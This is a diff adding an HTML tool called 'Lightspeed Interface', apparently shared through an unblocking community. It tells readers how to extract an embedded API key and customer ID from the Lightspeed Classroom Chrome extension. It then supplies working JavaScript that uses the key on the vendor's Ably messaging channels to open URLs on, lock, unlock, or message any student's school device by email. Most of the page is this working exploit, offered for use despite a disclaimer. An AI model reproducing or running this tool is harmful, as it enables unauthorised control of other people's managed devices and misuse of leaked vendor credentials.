@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<!-- 
+    website creation: luphoria -- https://luphoria.com
+    initial report: anonymous TitaniumNetwork (https://titaniumnetwork.org) user
+-->
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+
+  <body>
+    <h1>Lightspeed Interface</h1>
+    <i>This tool should not be used for illegal activity.</i>
+    <p>With this tool, you can interface with devices on a Lightspeed network, given you have the credentials.</p>
+    <p><b>To get credentials:</b> find the extension ID for your "Classroom" extension, and then visit the website <code>chrome-extension://<b>[YOUR CLASSROOM EXTENSION ID]</b>/index.js</code>. The webpage is just a bunch of code, but here's what you need to do:</p>
+    <p>- Find (Ctrl+F): <b><code>key:"</code></b>. Between the two double quotes (<code>"</code> and the next <code>"</code>), there is a string of random characters. It should start with <b><code>1k1Wbw.</code></b> or something similar. Copy this and paste it to the "Key" section of this tool.
+    <br/>- Find (Ctrl+F): <b><code>customerId:"</code></b>. You should find, between two double quotes, an ID formatted like this: <b><code>XX-XXXX-XXXX</code></b>. Copy this and paste it in the "Customer ID" input on this tool.</p>
+    <p>Then, click "Set" on this tool. From here, you're ready to go! Enter the email of the device you want to interact with, and simply use the tools here to open links, lock/unlock the device, or send messages to it.</p>
+    <br />
+    <input
+      id="authKey"
+      placeholder="1k1Wbw.xxxxxx.xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx..."
+      value=""
+    />
+    Key
+    <br />
+    <input id="customerId" placeholder="00-0000-0000" value="" /> Customer ID
+    <br />
+    <button onclick="start(document.getElementById('authKey').value, document.getElementById('customerId').value)">
+      Set
+    </button>
+    <div id="saved" style="color: green; display: none">Saved.</div>
+    <div id="error" style="color: red; display: none">Error.</div>
+    <br /><br />
+
+    <input id="studentId" placeholder="email@district.school" value="" /> Device email
+    <br /><br />
+
+    <input id="urlInput" placeholder="https://google.com" /><button
+      onclick="openUrl(document.getElementById('urlInput').value)"
+    >
+      Open
+    </button>
+    <br />
+    Device state 
+    <button onclick="lock()">Lock</button
+    ><button onclick="unlock()">Unlock</button>
+    <br />
+
+    <input id="msg" placeholder="message" /><button
+      onclick="sendMessage(document.getElementById('msg').value)"
+    >
+      Message
+    </button>
+
+    <br /><br /><br /><br /><br /><br />
+    <p style="text-align:right">This kajig was anonymously reported by a TitaniumNetwork user. The website was slightly refined by <a href="https://luphoria.com" target="_blank">luphoria</a>.<br/>
+        join <b>TitaniumNetwork</b>: <a href="https://discord.gg/unblock">discord.gg/unblock</a>
+    <script src="https://cdn.ably.com/lib/ably.min-1.js"></script>
+    <!--TODO run locally-->
+    <script>
+      let client;
+      const start = (key, customerId) => {
+        let options = {
+          key: key,
+          timestamp: Date.now(),
+          echoMessages: false,
+          environment: "lightspeed",
+          fallbackHosts: [
+            "a-fallback-lightspeed.ably.io",
+            "b-fallback-lightspeed.ably.io",
+            "c-fallback-lightspeed.ably.io",
+          ],
+        };
+        try {
+          client = new Ably.Realtime(options);
+          localStorage.lsKey = key;
+          localStorage.customerId = customerId;
+          document.getElementById("saved").style.display = "inline";
+          document.getElementById("error").style.display = "none";
+        } catch {
+          document.getElementById("saved").style.display = "none";
+          document.getElementById("error").style.display = "inline";
+        }
+      };
+
+      if (localStorage.lsKey && localStorage.customerId) { // Previously set values
+        document.getElementById("authKey").value = localStorage.lsKey;
+        document.getElementById("customerId").value = localStorage.customerId;
+        start(localStorage.lsKey, localStorage.customerId);
+      }
+
+      const publish = (type, content) => {
+        client.channels
+          .get(`${customerId.value}:${studentId.value}`)
+          .publish(type, content);
+      };
+    </script>
+
+    <script>
+      function openUrl(url) {
+        publish("url", url);
+      }
+
+      function lock() {
+        publish("lock", "");
+      }
+
+      function unlock() {
+        publish("unlock", "");
+      }
+
+      function sendMessage(msg) {
+        publish("tm", { m: msg });
+      }
+    </script>
+  </body>
+</html>
